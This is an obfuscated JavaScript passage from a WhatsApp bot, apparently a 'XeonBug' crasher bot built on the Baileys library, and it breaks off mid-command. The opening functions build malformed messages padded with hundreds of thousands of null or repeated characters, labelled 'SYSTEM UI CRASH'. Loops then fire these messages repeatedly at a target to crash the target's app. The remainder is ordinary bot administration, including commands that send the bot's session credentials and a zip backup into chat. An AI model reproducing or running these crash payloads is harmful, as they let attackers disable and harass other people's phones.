    async function _0x45f41e(_0x20296a) {
      const _0x4158a3 = {
        title: '',
        subtitle: " "
      };
      const _0x214568 = {
        text: 'xp'
      };
      var _0x119569 = generateWAMessageFromContent(_0x20296a, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': _0x4158a3,
              'body': {
                'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
              },
              'footer': _0x214568,
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        'userJid': _0x20296a
      });
      await _0x3dc8b7.relayMessage(_0x20296a, _0x119569.message, {
        'participant': {
          'jid': _0x20296a
        },
        'messageId': _0x119569.key.id
      });
    }
    async function _0x11c71f(_0x3e8b6e) {
      const _0xb4c0e5 = {
        productId: "4392524570816732"
      };
      const _0x580442 = {
        productId: "4392524570816732",
        jpegThumbnail: null
      };
      const _0x9cc6aa = {
        product_header_info_id: 0x4433e2e130,
        product_header_is_rejected: false
      };
      var _0x1f5260 = generateWAMessageFromContent(_0x3e8b6e, proto.Message.fromObject({
        'listMessage': {
          'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
          'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [_0xb4c0e5]
            }],
            'productListHeaderImage': _0x580442,
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': 'whatsapp',
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': _0x9cc6aa
      }), {
        'userJid': _0x3e8b6e
      });
      await _0x3dc8b7.relayMessage(_0x3e8b6e, _0x1f5260.message, {
        'participant': {
          'jid': _0x3e8b6e
        },
        'messageId': _0x1f5260.key.id
      });
    }
    async function _0x182eb5(_0x2fcda9) {
      var _0x45572a = generateWAMessageFromContent(_0x2fcda9, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x2fcda9
      });
      await _0x3dc8b7.relayMessage(_0x2fcda9, _0x45572a.message, {
        'participant': {
          'jid': _0x2fcda9
        },
        'messageId': _0x45572a.key.id
      });
    }
    async function _0x4bfdf7(_0xcfa791) {
      const _0x56d2dd = {
        messageId: null
      };
      _0x3dc8b7.relayMessage(_0xcfa791, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0xcfa791,
            'participant': _0xcfa791,
            'quotedMessage': {
              'conversation': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(50000)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0xcfa791
        }
      }, _0x56d2dd);
    }
    async function _0x3371e8(_0x5ade51) {
      _0x3dc8b7.relayMessage(_0x5ade51, {
        'paymentInviteMessage': {
          'serviceType': 'UPI',
          'expiryTimestamp': Date.now() + 86400000
        }
      }, {
        'participant': {
          'jid': _0x5ade51
        }
      });
    }
    async function _0x5a294(_0x5bad90, _0x5d19e2) {
      for (let _0x26fed8 = 0; _0x26fed8 < _0x5d19e2; _0x26fed8++) {
        _0x3371e8(_0x5bad90);
        _0x4bfdf7(_0x5bad90);
        await sleep(500);
      }
    }
    async function _0x46f07e(_0x2923f6, _0x12bb54) {
      for (let _0x1f4929 = 0; _0x1f4929 < _0x12bb54; _0x1f4929++) {
        _0x11c71f(_0x2923f6);
        _0x182eb5(_0x2923f6);
        _0x45f41e(_0x2923f6);
        await sleep(500);
      }
    }
    async function _0x4ee10f(_0x5749c3, _0x1cb04f) {
      for (let _0x389393 = 0; _0x389393 < _0x1cb04f; _0x389393++) {
        _0x45f41e(_0x5749c3);
        _0x45f41e(_0x5749c3);
        _0x45f41e(_0x5749c3);
        await sleep(500);
      }
    }
    async function _0x400568(_0x1fc95b, _0x1634fd) {
      for (let _0x3c406c = 0; _0x3c406c < _0x1634fd; _0x3c406c++) {
        _0x182eb5(_0x1fc95b);
        _0x11c71f(_0x1fc95b);
        await sleep(500);
      }
    }
    function _0x14716a(_0x4f0844, _0x367368 = [], _0x545608 = false) {
      if (_0x545608 == null || _0x545608 == undefined || _0x545608 == false) {
        const _0x24f5ca = {
          text: _0x4f0844,
          mentions: _0x367368
        };
        return _0x3dc8b7.sendMessage(_0x153ead.chat, _0x24f5ca, {
          'quoted': _0x153ead
        });
      } else {
        const _0x2d0acd = {
          text: _0x4f0844,
          mentions: _0x367368
        };
        return _0x3dc8b7.sendMessage(_0x153ead.chat, _0x2d0acd, {
          'quoted': _0x153ead
        });
      }
    }
    const _0x54c867 = _0xd01689 => {
      const _0x7ba7d3 = {
        text: _0xd01689,
        mentions: [_0x544b4]
      };
      const _0x1abc1a = {
        quoted: _0x153ead
      };
      _0x3dc8b7.sendMessage(_0x22825f, _0x7ba7d3, _0x1abc1a)['catch'](_0x4ee747 => {
        return reply("Erro..");
      });
    };
    async function _0x51687e() {
      var _0x4e8b81 = ["《😈》10%", "《😈😈😈》30%", "《😈😈😈😈😈》50%", "《😈😈😈😈😈😈😈😈》80%", "《😈😈😈😈😈😈😈😈😈😈》100%", "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 😈..."];
      const _0x4d32d7 = {
        'text': "ʟᴏᴀᴅɪɴɢ..."
      };
      let {
        key: _0x5efda7
      } = await _0x3dc8b7.sendMessage(_0x22825f, _0x4d32d7);
      for (let _0x19c401 = 0; _0x19c401 < _0x4e8b81.length; _0x19c401++) {
        const _0x51d3dc = {
          text: _0x4e8b81[_0x19c401],
          edit: _0x5efda7
        };
        await _0x3dc8b7.sendMessage(_0x22825f, _0x51d3dc);
      }
    }
    if (!_0x3dc8b7["public"]) {
      if (!_0x891b49 && !_0x153ead.key.fromMe) {
        return;
      }
    }
    if (autoread) {
      _0x3dc8b7.readMessages([_0x153ead.key]);
    }
    if (global.autoTyping) {
      _0x3dc8b7.sendPresenceUpdate("composing", _0x22825f);
    }
    if (global.autoRecording) {
      _0x3dc8b7.sendPresenceUpdate("recording", _0x22825f);
    }
    _0x3dc8b7.sendPresenceUpdate('uavailable', _0x22825f);
    if (global.autorecordtype) {
      let _0x2bbd38 = ["recording", "composing"];
      let _0x49e5fd = _0x2bbd38[Math.floor(Math.random() * _0x2bbd38.length)];
      _0x3dc8b7.sendPresenceUpdate(_0x49e5fd, _0x22825f);
    }
    if (autobio) {
      _0x3dc8b7.updateProfileStatus("24/7 Online Bot By " + ownername)["catch"](_0x165cb1 => _0x165cb1);
    }
    if (_0x153ead.sender.startsWith('92') && global.anti92 === true) {
      return _0x3dc8b7.updateBlockStatus(_0x153ead.sender, "block");
    }
    let _0x46f814 = [];
    for (let _0x4e46c1 of owner) {
      _0x46f814.push({
        'displayName': await _0x3dc8b7.getName(_0x4e46c1),
        'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:" + (await _0x3dc8b7.getName(_0x4e46c1)) + "\nFN:" + (await _0x3dc8b7.getName(_0x4e46c1)) + "\nitem1.TEL;waid=" + _0x4e46c1 + ':' + _0x4e46c1 + "\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:" + ytname + "\nitem2.X-ABLabel:YouTube\nitem3.URL:" + socialm + "\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;" + location + ";;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      });
    }
    if (_0x153ead.message && _0x153ead.isGroup) {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Group Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0xbbd56 || _0x153ead.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0x5cd3c0), chalk.yellow(_0x153ead.sender) + "\n" + chalk.blueBright("=> In"), chalk.green(_0x28a966, _0x153ead.chat));
    } else {
      console.log(chalk.cyan("\n< ================================================== >\n"));
      console.log(chalk.green("Private Chat:"));
      console.log(chalk.black(chalk.bgWhite("[ MESSAGE ]")), chalk.black(chalk.bgGreen(new Date())), chalk.black(chalk.bgBlue(_0xbbd56 || _0x153ead.mtype)) + "\n" + chalk.magenta("=> From"), chalk.green(_0x5cd3c0), chalk.yellow(_0x153ead.sender));
    }
    if (_0x44cd63) {
      const _0x3833a8 = () => {
        hit[0].hit_cmd += 1;
        fs.writeFileSync("./database/total-hit-user.json", JSON.stringify(hit));
      };
      _0x3833a8();
    }
    for (let _0x14847a of VoiceNoteXeon) {
      if (_0xbbd56 === _0x14847a) {
        let _0x447f5b = fs.readFileSync("./XeonMedia/audio/" + _0x14847a + ".mp3");
        const _0xca57fc = {
          audio: _0x447f5b,
          mimetype: 'audio/mp4',
          ptt: true
        };
        _0x3dc8b7.sendMessage(_0x153ead.chat, _0xca57fc, {
          'quoted': _0x153ead
        });
      }
    }
    for (let _0x159310 of StickerXeon) {
      if (_0xbbd56 === _0x159310) {
        let _0x4f9c84 = fs.readFileSync("./XeonMedia/sticker/" + _0x159310 + ".webp");
        const _0x871f = {
          sticker: _0x4f9c84
        };
        _0x3dc8b7.sendMessage(_0x153ead.chat, _0x871f, {
          'quoted': _0x153ead
        });
      }
    }
    for (let _0x567b76 of ImageXeon) {
      if (_0xbbd56 === _0x567b76) {
        let _0x382a4f = fs.readFileSync("./XeonMedia/image/" + _0x567b76 + ".jpg");
        const _0x3e8d34 = {
          image: _0x382a4f
        };
        _0x3dc8b7.sendMessage(_0x153ead.chat, _0x3e8d34, {
          'quoted': _0x153ead
        });
      }
    }
    for (let _0x456738 of VideoXeon) {
      if (_0xbbd56 === _0x456738) {
        let _0xc487c2 = fs.readFileSync("./XeonMedia/video/" + _0x456738 + ".mp4");
        const _0x533d0 = {
          video: _0xc487c2
        };
        _0x3dc8b7.sendMessage(_0x153ead.chat, _0x533d0, {
          'quoted': _0x153ead
        });
      }
    }
    const _0xcfce7b = _0x7971d1 => {
      const _0x55f886 = {
        document: _0x7971d1,
        mimetype: "application/vnd.android.package-archive"
      };
      const _0x405aa4 = {
        quoted: _0x153ead
      };
      _0x3dc8b7.sendMessage(_0x22825f, _0x55f886, _0x405aa4);
    };
    for (let _0x1f7621 of ApkXeon) {
      if (_0xbbd56 === _0x1f7621) {
        let _0xec0114 = fs.readFileSync("./XeonMedia/apk/" + _0x1f7621 + ".apk");
        _0xcfce7b(_0xec0114);
      }
    }
    const _0x22bd4d = _0x3d7707 => {
      const _0x42c875 = {
        document: _0x3d7707
      };
      _0x42c875.mimetype = "application/zip";
      const _0x1ebedf = {
        quoted: _0x153ead
      };
      _0x3dc8b7.sendMessage(_0x22825f, _0x42c875, _0x1ebedf);
    };
    for (let _0x126119 of ZipXeon) {
      if (_0xbbd56 === _0x126119) {
        let _0x1d4bd6 = fs.readFileSync("./XeonMedia/zip/" + _0x126119 + ".zip");
        _0x22bd4d(_0x1d4bd6);
      }
    }
    const _0x20f3ff = _0x15454f => {
      const _0x3dde13 = {
        document: _0x15454f,
        mimetype: "application/pdf"
      };
      const _0x256ba3 = {
        quoted: _0x153ead
      };
      haikal.sendMessage(_0x22825f, _0x3dde13, _0x256ba3);
    };
    for (let _0x3904d1 of DocXeon) {
      if (_0xbbd56 === _0x3904d1) {
        let _0x2e760a = fs.readFileSync("./XeonMedia/doc/" + _0x3904d1 + ".pdf");
        _0x20f3ff(_0x2e760a);
      }
    }
    if (_0x153ead.isGroup && !_0x153ead.key.fromMe) {
      let _0x4c5a58 = [...new Set([...(_0x153ead.mentionedJid || []), ...(_0x153ead.quoted ? [_0x153ead.quoted.sender] : [])])];
      for (let _0x2bd6b9 of _0x4c5a58) {
        if (afk.checkAfkUser(_0x2bd6b9, _afk)) {
          let _0x3f3248 = afk.getAfkId(_0x2bd6b9, _afk);
          let _0x465ef1 = afk.getAfkReason(_0x3f3248, _afk);
          _0x244b45("Don't tag him, he's afk\n\n*Reason :* " + _0x465ef1);
        }
      }
      if (afk.checkAfkUser(_0x153ead.sender, _afk)) {
        _afk.splice(afk.getAfkPosition(_0x153ead.sender, _afk), 1);
        fs.writeFileSync("./database/afk-user.json", JSON.stringify(_afk));
        _0x3dc8b7.sendTextWithMentions(_0x153ead.chat, '@' + _0x153ead.sender.split('@')[0] + " have returned from afk", _0x153ead);
      }
    }
    switch (_0x44cd63) {
      case "addprem":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 2) {
          return _0x244b45("Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d");
        }
        if (_0x153ead.mentionedJid.length !== 0) {
          for (let _0x4f5f44 = 0; _0x4f5f44 < _0x153ead.mentionedJid.length; _0x4f5f44++) {
            addPremiumUser(_0x153ead.mentionedJid[0], _0x2805cb[1], premium);
          }
          _0x244b45("Premium Success");
        } else {
          addPremiumUser(_0x2805cb[0] + "@s.whatsapp.net", _0x2805cb[1], premium);
          _0x244b45("Success");
        }
        break;
      case "delprem":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 1) {
          return _0x244b45("Use :\n*#delprem* @tag\n*#delprem* number");
        }
        if (_0x153ead.mentionedJid.length !== 0) {
          for (let _0x333b76 = 0; _0x333b76 < _0x153ead.mentionedJid.length; _0x333b76++) {
            premium.splice(getPremiumPosition(_0x153ead.mentionedJid[_0x333b76], premium), 1);
            fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          }
          _0x244b45("Delete success");
        } else {
          premium.splice(getPremiumPosition(_0x2805cb[0] + "@s.whatsapp.net", premium), 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
          _0x244b45("Success");
        }
        break;
      case "listprem":
        {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          let _0x316b73 = require("./database/premium.json");
          let _0x189a4f = "*------「 LIST PREMIUM 」------*\n\n";
          for (let _0x268d0f of _0x316b73) {
            _0x189a4f += "Number : " + _0x268d0f.id + "\n";
            _0x189a4f += "Expired : " + _0x268d0f.expired + " Second\n";
          }
          const _0x5a62c3 = {
            text: _0x189a4f,
            mentions: i
          };
          _0x3dc8b7.sendMessage(_0x153ead.chat, _0x5a62c3, {
            'quoted': _0x153ead
          });
        }
        break;
      case "deletesession":
      case "delsession":
      case "clearsession":
        {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          fs.readdir("./session", async function (_0x26d5b8, _0x5bc005) {
            if (_0x26d5b8) {
              console.log("Unable to scan directory: " + _0x26d5b8);
              return _0x244b45("Unable to scan directory: " + _0x26d5b8);
            }
            let _0x14c29d = await _0x5bc005.filter(_0x5b1585 => _0x5b1585.startsWith("pre-key") || _0x5b1585.startsWith("sender-key") || _0x5b1585.startsWith("session-") || _0x5b1585.startsWith("app-state"));
            console.log(_0x14c29d.length);
            let _0x1844b8 = "Detected " + _0x14c29d.length + " junk files\n\n";
            if (_0x14c29d.length == 0) {
              return _0x244b45(_0x1844b8);
            }
            _0x14c29d.map(function (_0x52eae1, _0x23090c) {
              _0x1844b8 += _0x23090c + 1 + (". " + _0x52eae1 + "\n");
            });
            _0x244b45(_0x1844b8);
            await sleep(2000);
            _0x244b45("Delete junk files...");
            await _0x14c29d.forEach(function (_0x2d7374) {
              fs.unlinkSync("./session/" + _0x2d7374);
            });
            await sleep(2000);
            _0x244b45("Successfully deleted all the trash in the session folder");
          });
        }
        break;
      case 'join':
        try {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          if (!_0x570816) {
            return _0x244b45("Enter Group Link!");
          }
          if (!isUrl(_0x2805cb[0]) && !_0x2805cb[0].includes("whatsapp.com")) {
            return _0x244b45("Link Invalid!");
          }
          _0x244b45(mess.wait);
          let _0x3f8810 = _0x2805cb[0].split("https://chat.whatsapp.com/")[1];
          await _0x3dc8b7.groupAcceptInvite(_0x3f8810).then(_0x18b420 => _0x244b45(json(_0x18b420)))["catch"](_0x52aa5d => _0x244b45(json(_0x52aa5d)));
        } catch {
          _0x244b45("Failed to join the Group");
        }
        break;
      case "getsession":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        _0x244b45("Wait a moment, currently retrieving your session file");
        let _0x11c2ca = await fs.readFileSync("./session/creds.json");
        const _0xae4ac6 = {
          document: _0x11c2ca,
          mimetype: "application/json",
          fileName: "creds.json"
        };
        _0x3dc8b7.sendMessage(_0x153ead.chat, _0xae4ac6, {
          'quoted': _0x153ead
        });
        break;
      case 'shutdown':
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        _0x244b45("Goodbye🖐");
        await sleep(3000);
        process.exit();
        break;
      case "restart":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        _0x244b45("In Process....");
        exec("pm2 restart all");
        break;
      case "autoread":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 1) {
          return _0x244b45("Example " + (_0x1b9ee2 + _0x44cd63) + " on/off");
        }
        if (q === 'on') {
          autoread = true;
          _0x244b45("Successfully changed autoread to " + q);
        } else if (q === "off") {
          autoread = false;
          _0x244b45("Successfully changed autoread to " + q);
        }
        break;
      case "autotyping":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 1) {
          return _0x244b45("Example " + (_0x1b9ee2 + _0x44cd63) + " on/off");
        }
        if (q === 'on') {
          autoTyping = true;
          _0x244b45("Successfully changed auto-typing to " + q);
        } else if (q === "off") {
          autoTyping = false;
          _0x244b45("Successfully changed auto-typing to " + q);
        }
        break;
      case "autorecording":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 1) {
          return _0x244b45("Example " + (_0x1b9ee2 + _0x44cd63) + " on/off");
        }
        if (q === 'on') {
          autoRecording = true;
          _0x244b45("Successfully changed auto-recording to " + q);
        } else if (q === "off") {
          autoRecording = false;
          _0x244b45("Successfully changed auto-recording to " + q);
        }
        break;
      case "autorecordtyp":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 1) {
          return _0x244b45("Example " + (_0x1b9ee2 + _0x44cd63) + " on/off");
        }
        if (q === 'on') {
          autorecordtype = true;
          _0x244b45("Successfully changed auto recording and typing to " + q);
        } else if (q === "off") {
          autorecordtype = false;
          _0x244b45("Successfully changed auto recording and typing to " + q);
        }
        break;
      case 'autoswview':
      case "autostatusview":
        {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("on/off?");
          }
          if (_0x2805cb[0] === 'on') {
            autoswview = true;
            _0x244b45(_0x44cd63 + " is enabled");
          } else if (_0x2805cb[0] === "off") {
            autoswview = false;
            _0x244b45(_0x44cd63 + " is disabled");
          }
        }
        break;
      case "autobio":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 1) {
          return _0x244b45("Example " + (_0x1b9ee2 + _0x44cd63) + " on/off");
        }
        if (q == 'on') {
          autobio = true;
          _0x244b45("Successfully Changed AutoBio To " + q);
        } else if (q == "off") {
          autobio = false;
          _0x244b45("Successfully Changed AutoBio To " + q);
        }
        break;
      case "mode":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x2805cb.length < 1) {
          return _0x244b45("Example " + (_0x1b9ee2 + _0x44cd63) + " public/self");
        }
        if (q == "public") {
          _0x3dc8b7["public"] = true;
          _0x244b45(mess.done);
        } else if (q == "self") {
          _0x3dc8b7["public"] = false;
          _0x244b45(mess.done);
        }
        break;
      case "setexif":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (!_0x570816) {
          return _0x244b45("Example : " + (_0x1b9ee2 + _0x44cd63) + " packname|author");
        }
        global.packname = _0x570816.split('|')[0];
        global.author = _0x570816.split('|')[1];
        _0x244b45("Exif successfully changed to\n\n• Packname : " + global.packname + "\n• Author : " + global.author);
        break;
      case "setpp":
      case "setpp":
      case 'setppbot':
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (!_0x1fa415) {
          return _0x244b45("Send/Reply Image With Caption " + (_0x1b9ee2 + _0x44cd63));
        }
        if (!/image/.test(_0x24c389)) {
          return _0x244b45("Send/Reply Image With Caption " + (_0x1b9ee2 + _0x44cd63));
        }
        if (/webp/.test(_0x24c389)) {
          return _0x244b45("Send/Reply Image With Caption " + (_0x1b9ee2 + _0x44cd63));
        }
        var _0x43ee83 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415, 'ppbot.jpeg');
        if (_0x2805cb[0] == "full") {
          var {
            img: _0x1cecae
          } = await generateProfilePicture(_0x43ee83);
          const _0x4fb869 = {
            to: _0x493b39,
            type: "set",
            xmlns: "w:profile:picture"
          };
          const _0x33e3ab = {
            'type': 'image'
          };
          const _0x2a11fe = {
            tag: "picture",
            attrs: _0x33e3ab,
            content: _0x1cecae
          };
          const _0x5a8256 = {
            tag: 'iq',
            attrs: _0x4fb869,
            content: [_0x2a11fe]
          };
          await _0x3dc8b7.query(_0x5a8256);
          fs.unlinkSync(_0x43ee83);
          _0x244b45(mess.done);
        } else {
          const _0x1d9b5c = {
            url: _0x43ee83
          };
          var _0x2d247d = await _0x3dc8b7.updateProfilePicture(_0x493b39, _0x1d9b5c);
          fs.unlinkSync(_0x43ee83);
          _0x244b45(mess.done);
        }
        break;
      case "block":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        let _0x452fbe = _0x153ead.mentionedJid[0] ? _0x153ead.mentionedJid[0] : _0x153ead.quoted ? _0x153ead.quoted.sender : _0x570816.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x3dc8b7.updateBlockStatus(_0x452fbe, "block").then(_0xd03101 => _0x244b45(json(_0xd03101)))['catch'](_0x9238d6 => _0x244b45(json(_0x9238d6)));
        break;
      case "unblock":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        let _0x4c423a = _0x153ead.mentionedJid[0] ? _0x153ead.mentionedJid[0] : _0x153ead.quoted ? _0x153ead.quoted.sender : _0x570816.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x3dc8b7.updateBlockStatus(_0x4c423a, "unblock").then(_0x5c85e2 => _0x244b45(json(_0x5c85e2)))["catch"](_0x349053 => _0x244b45(json(_0x349053)));
        break;
      case "leave":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        _0x244b45("Bye Everyone 🥺");
        await _0x3dc8b7.groupLeave(_0x153ead.chat);
        break;
      case "backup":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (_0x153ead.isGroup) {
          return _0x244b45(mess["private"]);
        }
        _0x244b45(mess.wait);
        exec("zip backup.zip *");
        let _0x3c66c5 = await fs.readFileSync("./backup.zip");
        const _0x379a1f = {
          document: _0x3c66c5,
          mimetype: "application/zip",
          fileName: "backup.zip"
        };
        await _0x3dc8b7.sendMessage(_0x153ead.chat, _0x379a1f, {
          'quoted': _0x153ead
        });
        break;
      case "bcgc":
      case "bcgroup":
        {
          if (!_0x891b49) {
            return _0x244b45(mess.owner);
          }
          if (!_0x570816) {
            return _0x244b45("Which text?\n\nExample : " + (_0x1b9ee2 + _0x44cd63) + " It's holiday tomorrow ");
          }
          let _0x570708 = await _0x3dc8b7.groupFetchAllParticipating();
          let _0x6e5e7 = Object.entries(_0x570708).slice(0).map(_0x96eb69 => _0x96eb69[1]);
          let _0x28bc25 = _0x6e5e7.map(_0x42f8d6 => _0x42f8d6.id);
          _0x244b45("Send Broadcast To " + _0x28bc25.length + " Group Chat, End Time " + _0x28bc25.length * 1.5 + " second");
          for (let _0x59894e of _0x28bc25) {
            await sleep(1500);
            let _0xa09a18 = "```" + ("\n\n" + _0x570816 + "\n\n") + "```" + "\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ";
            _0x3dc8b7.sendMessage(_0x59894e, {
              'text': _0xa09a18,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': true,
                  'title': "Broadcast By Owner",
                  'body': "Sent " + _0x59894e.length + " Group",
                  'thumbnailUrl': "https://telegra.ph/file/99f6c6aa9d0e38722e855.jpg",
                  'sourceUrl': global.link,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            });
          }
          _0x244b45("Successfully Sent Broadcast To " + _0x28bc25.length + " Group");
        }
        break;
      case "getcase":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        _0x244b45('' + ('case' + ("'" + q + "'") + fs.readFileSync("XeonBug3.js").toString().split("case '" + q + "'")[1].split("break")[0] + "break"));
        break;
      case "delete":
      case "del":
        {
          if (!_0x891b49) {
            return _0x244b45(mess.done);
          }
          if (!_0x153ead.quoted) {
            throw false;
          }
          let {
            chat: _0x59c695,
            fromMe: _0x5d1e21,
            id: _0x3a9832,
            isBaileys: _0xc71679
          } = _0x153ead.quoted;
          if (!_0xc71679) {
            return _0x244b45("The message was not sent by a bot!");
          }
          _0x3dc8b7.sendMessage(_0x153ead.chat, {
            'delete': {
              'remoteJid': _0x153ead.chat,
              'fromMe': true,
              'id': _0x153ead.quoted.id,
              'participant': _0x153ead.quoted.sender
            }
          });
        }
        break;
      case "closetime":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        if (_0x2805cb[1] == "detik") {
          var _0x38ac02 = _0x2805cb[0] * '1000';
        } else {
          if (_0x2805cb[1] == 'menit') {
            var _0x38ac02 = _0x2805cb[0] * '60000';
          } else {
            if (_0x2805cb[1] == "jam") {
              var _0x38ac02 = _0x2805cb[0] * "3600000";
            } else {
              if (_0x2805cb[1] == "hari") {
                var _0x38ac02 = _0x2805cb[0] * "86400000";
              } else {
                return _0x244b45("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x244b45("Close time " + q + " starting from now");
        setTimeout(() => {
          _0x3dc8b7.groupSettingUpdate(_0x153ead.chat, "announcement");
          _0x244b45("*Closed* group closed by admin\nnow only admin can send messages");
        }, _0x38ac02);
        break;
      case "opentime":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        if (_0x2805cb[1] == "second") {
          var _0x38ac02 = _0x2805cb[0] * "1000";
        } else {
          if (_0x2805cb[1] == 'minute') {
            var _0x38ac02 = _0x2805cb[0] * "60000";
          } else {
            if (_0x2805cb[1] == 'hour') {
              var _0x38ac02 = _0x2805cb[0] * '3600000';
            } else {
              if (_0x2805cb[1] == "day") {
                var _0x38ac02 = _0x2805cb[0] * "86400000";
              } else {
                return _0x244b45("*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second");
              }
            }
          }
        }
        _0x244b45("Open time " + q + " starting from now");
        setTimeout(() => {
          _0x3dc8b7.groupSettingUpdate(_0x153ead.chat, "not_announcement");
          _0x244b45("*Opened* The group is opened by admin\nNow members can send messages");
        }, _0x38ac02);
        break;
      case "kick":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        let _0x5908e0 = _0x153ead.mentionedJid[0] ? _0x153ead.mentionedJid[0] : _0x153ead.quoted ? _0x153ead.quoted.sender : _0x570816.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x3dc8b7.groupParticipantsUpdate(_0x153ead.chat, [_0x5908e0], "remove").then(_0x401208 => _0x244b45(json(_0x401208)))["catch"](_0x43070d => _0x244b45(json(_0x43070d)));
        break;
      case 'add':
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        let _0x5a8f52 = _0x153ead.quoted ? _0x153ead.quoted.sender : _0x570816.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
